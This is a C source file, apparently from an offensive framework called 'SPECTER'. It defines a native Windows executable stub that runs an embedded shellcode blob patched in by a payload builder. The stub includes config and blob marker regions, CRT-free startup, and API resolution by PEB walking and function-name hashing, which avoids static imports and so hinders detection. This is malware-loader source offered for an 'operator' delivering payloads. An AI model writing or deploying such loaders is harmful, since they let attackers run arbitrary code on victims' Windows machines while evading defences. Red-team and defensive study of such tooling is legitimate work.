/**
 * SPECTER Stubs -- Native EXE Stub ("dotnet" format slot)
 *
 * Minimal native Windows executable that executes an embedded PIC blob.
 * CRT-free, no static imports -- resolves VirtualAlloc via PEB walk.
 *
 * Despite the name, this is a native PE (not a .NET assembly).  It
 * occupies the "dotnet" format slot in the payload builder for cases
 * where the operator wants a plain EXE delivery format.
 *
 * Build: x86_64-w64-mingw32-gcc -nostdlib -ffreestanding
 *        -e WinMainCRTStartup -o dotnet_stub.exe dotnet_stub.c
 *
 * The payload builder patches two regions:
 *   1. Config marker  (CCCCCCCCCCCCCCCC + max_size + zero-pad)
 *   2. PIC blob marker (SPECPICBLOB\0 + size + blob data)
 */

#include "stub_common.h"

/* ------------------------------------------------------------------ */
/*  Embedded data section                                              */
/* ------------------------------------------------------------------ */

/* Config region */
__attribute__((section(".data"), used))
static volatile BYTE stub_config_region[CONFIG_MARKER_LEN + sizeof(DWORD) + CONFIG_MAX_CAPACITY] = {
    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
    0x00, 0x10, 0x00, 0x00, /* max_size = 4096 */
};

/* PIC blob region */
__attribute__((section(".data"), used))
static volatile BYTE stub_pic_region[PIC_MARKER_LEN + sizeof(DWORD) + PIC_MAX_CAPACITY] = {
    'S','P','E','C','P','I','C','B','L','O','B','\0',
    0x00, 0x00, 0x00, 0x00,
};

/* ------------------------------------------------------------------ */
/*  EXE entry point (CRT-free)                                         */
/* ------------------------------------------------------------------ */

__attribute__((ms_abi))
void WinMainCRTStartup(void) {
    stub_execute_payload();

    /* Exit with diagnostic code. 0 = PIC ran and returned, 100+ = stub failure */
    DWORD code = g_stub_exit_code;
    if (code == 0) code = 99; /* 99 = PIC entry returned normally */

    PVOID k32 = stub_find_module(HASH_KERNEL32_DLL);
    if (k32) {
        #define HASH_EXITPROCESS 0x024773DE
        typedef void (__attribute__((ms_abi)) *fn_ExitProcess)(DWORD uExitCode);
        fn_ExitProcess pExit =
            (fn_ExitProcess)stub_find_export(k32, HASH_EXITPROCESS);
        if (pExit)
            pExit(code);
    }

    /* Fallback: infinite loop (should never reach here) */
    for (;;) {}
}
